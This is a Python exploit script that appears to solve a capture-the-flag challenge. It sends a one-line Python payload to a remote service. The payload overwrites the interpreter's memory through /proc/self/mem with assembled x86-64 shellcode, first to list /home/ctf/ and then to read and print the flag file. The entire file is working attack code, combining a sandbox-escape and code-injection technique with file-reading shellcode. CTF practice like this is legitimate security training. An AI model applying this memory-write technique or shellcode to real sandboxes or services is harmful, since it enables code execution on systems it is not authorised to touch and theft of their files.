from ptrlib import *
import os
import time

HOST = os.getenv('HOST', 'localhost')
PORT = int(os.getenv('PORT', '9341'))

#
# Get flag path
#
shellcode = nasm(f"""
; openat(AT_FDCWD, "/", O_RDONLY)
mov edx, 0
lea rsi, [rel s_root]
mov rdi, -100
mov eax, {syscall.x64.openat}
syscall

; getdents(fd, dirent, 0x1000)
mov edx, 0x1000
mov rsi, rsp
mov edi, eax
mov eax, {syscall.x64.getdents}
syscall

mov r15, rax

xor r14, r14
xor edx, edx
.@Lp:
; write(1, cur->d_name, len_name)
mov dx, [rsp+r14+16]
sub edx, 20
lea rsi, [rsp+r14+18]
mov edi, 1
mov eax, {syscall.x64.write}
syscall

mov edx, 1
lea rsi, [rel s_newline]
mov edi, 1
mov eax, {syscall.x64.write}
syscall

mov dx, [rsp+r14+16]
add r14d, edx
cmp r14, r15
jl .@Lp

; exit(0)
xor edi, edi
mov eax, {syscall.x64.exit}
syscall

s_root: db "/home/ctf/",0
s_newline: db 0x0a
""", bits=64)

code = f"""
all(map(
 lambda fs: [
  fs[1].seek(int(fs[0].read(12),16)+0x18ebb8,0),
  fs[1].write(bytes.fromhex("{shellcode.hex()}")),
  fs[1].flush(),
  input()
 ],
 [(open("/proc/self/maps"), open("/proc/self/mem", "wb"))]
))
""".replace("\n", "")

sock = Socket(HOST, PORT)
sock.sendlineafter("code: ", code)
time.sleep(0.5)
sock.sendline("")
flag_path = sock.recvregex("(flag.+\.txt)")[0].decode()
sock.close()

logger.info("flag path: " + flag_path)

#
# Get flag contents
#
shellcode = nasm(f"""
; openat(AT_FDCWD, flag_path, O_RDONLY)
mov edx, 0
lea rsi, [rel s_flag]
mov rdi, -100
mov eax, {syscall.x64.openat}
syscall

; read(fd, buf, 0x100)
mov edx, 0x100
mov rsi, rsp
mov edi, eax
mov eax, {syscall.x64.read}
syscall

; write(1, buf, 0x100)
mov edi, 1
mov eax, {syscall.x64.write}
syscall

; exit(0)
xor edi, edi
mov eax, {syscall.x64.exit}
syscall

s_flag: db "{flag_path}", 0
""", bits=64)

code = f"""
all(map(
 lambda fs: [
  fs[1].seek(int(fs[0].read(12),16)+0x18ebb8,0),
  fs[1].write(bytes.fromhex("{shellcode.hex()}")),
  fs[1].flush(),
  input()
 ],
 [(open("/proc/self/maps"), open("/proc/self/mem", "wb"))]
))
""".replace("\n", "")

sock = Socket(HOST, PORT)
sock.sendlineafter("code: ", code)
time.sleep(0.5)
sock.sendline("")
print(sock.recvregex("ACSC\{.+\}"))
sock.close()
